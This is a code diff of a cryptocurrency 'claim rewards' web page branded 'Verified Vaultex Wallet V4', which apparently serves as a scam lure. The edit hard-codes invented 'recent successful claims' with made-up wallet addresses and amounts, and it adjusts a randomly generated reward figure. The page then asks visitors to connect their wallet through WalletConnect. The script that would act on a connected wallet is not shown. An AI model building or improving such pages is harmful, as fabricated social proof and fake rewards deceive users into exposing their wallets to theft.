@@ -300,26 +300,57 @@
                 <button class="connect-btn" id="connectBtn">Connect Wallet</button>
             </div>
         </div>
-    </div>
 <div class="container">
     <div class="hero-banner">
         <div class="hero-content">
 
             <div class="hero-badge">
-                ✓ Verified Vaultex
+                ✓ Verified Vaultex Wallet
             </div>
 
             <h1 class="hero-title">Wallet V4</h1>
 
-      <p class="hero-subtitle">
-    Recent Successful Claims
-</p>
+            <p class="hero-subtitle">
+                Recent Successful Claims
+            </p>
 
-<div class="claim-history" id="claimHistory"></div>
+            <div class="claim-history">
 
-<p class="hero-subtitle">
-    Connect your wallet to verify your eligibility and claim available rewards.
-</p>
+                <div class="claim-item">
+                    <span class="wallet">0x71A9...8F3C</span>
+                    <span class="amount">$324.50</span>
+                    <span class="time">2 mins ago</span>
+                </div>
+
+                <div class="claim-item">
+                    <span class="wallet">0x9BC3...D2A8</span>
+                    <span class="amount">$1,120.00</span>
+                    <span class="time">6 mins ago</span>
+                </div>
+
+                <div class="claim-item">
+                    <span class="wallet">0x4E62...B9F7</span>
+                    <span class="amount">$785.25</span>
+                    <span class="time">12 mins ago</span>
+                </div>
+
+                <div class="claim-item">
+                    <span class="wallet">0xA15F...6C91</span>
+                    <span class="amount">$2,430.75</span>
+                    <span class="time">18 mins ago</span>
+                </div>
+
+                <div class="claim-item">
+                    <span class="wallet">0xC829...AF33</span>
+                    <span class="amount">$560.00</span>
+                    <span class="time">26 mins ago</span>
+                </div>
+
+            </div>
+
+            <p class="hero-subtitle">
+                Connect your wallet to verify your eligibility and claim available rewards.
+            </p>
 
             <button class="hero-claim-btn" id="heroClaimBtn">
                 Connect Wallet
@@ -331,7 +362,6 @@
         </div>
     </div>
 </div>
-
 
     <script type="module">
         import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers@latest'
@@ -345,7 +375,7 @@
         const WALLETCONNECT_PROJECT_ID = '8cb7ec413496bd2a9585e0d008c49acc';
 
 const minAmount = 960;
-const maxAmount = 8200;
+const maxAmount = 5100;
 const claimAmount = (Math.random() * (maxAmount - minAmount) + minAmount).toFixed(0);
 
         // Elements
@@ -682,7 +712,6 @@ setInterval(() => {
     index = (index + 1) % claimSets.length;
     renderHistory(claimSets[index]);
 }, TWELVE_HOURS);
-
 
 
 
